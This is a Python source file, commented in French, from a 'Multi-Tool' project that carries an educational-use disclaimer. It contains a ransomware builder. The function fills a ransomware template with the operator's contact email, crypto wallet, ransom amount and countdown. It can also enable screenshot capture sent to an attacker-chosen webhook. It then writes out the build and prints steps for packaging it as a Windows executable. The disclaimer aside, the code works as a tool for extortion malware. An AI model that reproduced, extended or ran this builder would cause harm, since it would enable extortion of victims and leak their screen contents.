# ============================================================
#  Author      : Anonyme-001
#  Project     : Multi-Tool (Educational Purpose Only)
#  Year        : 2025
#
#  DISCLAIMER:
#  This code is provided for EDUCATIONAL PURPOSES ONLY.
#  It is intended to help understand programming, security
#  concepts, and defensive techniques.
#
#  ❌ Any malicious use is strictly prohibited.
#  ❌ Do NOT modify this code to perform illegal actions.
#  ❌ The author is NOT responsible for any misuse.
#
#  By using this code, you agree to use it responsibly
#  and within legal boundaries.
#
#  Copyright (c) 2025 Anonyme-001
#  See LICENSE file for details.
# ============================================================

import os
import shutil
from pathlib import Path

def build_ransomware_payload(config):
    """
    Construit le ransomware personnalisé à partir du template.
    """
    # 1. CHARGER LE TEMPLATE - CHEMIN CORRIGÉ
    template_path = Path("Programs/ScreenLocker-Builder/jester_ransomware_template.py")
    if not template_path.exists():
        # Essayer aussi dans le dossier courant
        alt_path = Path("jester_ransomware_template.py")
        if alt_path.exists():
            template_path = alt_path
        else:
            raise FileNotFoundError(f"❌ Fichier template introuvable : {template_path}\nPlace le fichier dans: {Path('Programs/ScreenLocker-Builder/').absolute()}")

    with open(template_path, 'r', encoding='utf-8') as f:
        content = f.read()

    # 2. REMPLACER LES VARIABLES DE BASE
    content = content.replace(
        "Email : anonyme-001@protonmail.com",
        f"Email : {config['email']}"
    )
    content = content.replace(
        "Portefeuille : 1TC-W01fH4ck3rsPwnEverything999999999",
        f"Portefeuille : {config['wallet']}"
    )
    content = content.replace(
        "Montant : 3 000 € EUR",
        f"Montant : {config['amount']:,} € EUR".replace(",", " ")
    )

    # 3. MODIFIER LE DÉLAI
    content = content.replace(
        "24 HEURES après l’infection",
        f"{config['timer_hours']} HEURES après l’infection"
    )
    old_seconds = 24 * 60 * 60
    new_seconds = config['timer_hours'] * 60 * 60
    content = content.replace(
        f".addSecs({old_seconds})",
        f".addSecs({new_seconds})"
    )

    # 4. INJECTION DU WEBHOOK (PARTIE LA PLUS IMPORTANTE)
    if config['webhook']:
        # Activer la fonctionnalité
        content = content.replace(
            'CAPTURE_SCREENSHOT = False',
            'CAPTURE_SCREENSHOT = True'
        )
        # Insérer l'URL du webhook
        content = content.replace(
            'WEBHOOK_URL = ""',
            f'WEBHOOK_URL = "{config["webhook"]}"'
        )
        # S'assurer que le code de capture est activé
        if 'def capture_and_send():' in content:
            print("[DEBUG] Fonction capture_and_send trouvée dans le template.")
    else:
        # Désactiver si vide
        content = content.replace(
            'CAPTURE_SCREENSHOT = False',
            'CAPTURE_SCREENSHOT = False'
        )
        content = content.replace(
            'WEBHOOK_URL = ""',
            'WEBHOOK_URL = ""'
        )

    # 5. SAUVEGARDER LE NOUVEAU FICHIER
    output_dir = Path("Programs/ScreenLocker-Builder/builds")
    output_dir.mkdir(exist_ok=True)

    safe_name = config['email'].split('@')[0].replace('.', '_')[:15]
    output_filename = f"tcwolf_{safe_name}_v2.py"
    output_path = output_dir / output_filename

    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(content)

    print(f"""
✅ Fichier créé : {output_path}

⚠️ INSTRUCTIONS CRITIQUES :
1. INSTALLER LES MODULES SUR TON PC (où tu exécutes le .py) :
   pip install pyautogui requests

2. POUR CRÉER UN .EXE (optionnel) :
   pyinstaller --onefile --windowed --hidden-import pyautogui --hidden-import requests "{output_path}"
   Le .exe sera dans le dossier 'dist/'

3. TEST : Exécute le fichier .py sur ton propre PC d'abord.
   Un fichier 'ransomware_debug.log' devrait apparaître sur ton Bureau.
""")

    return output_path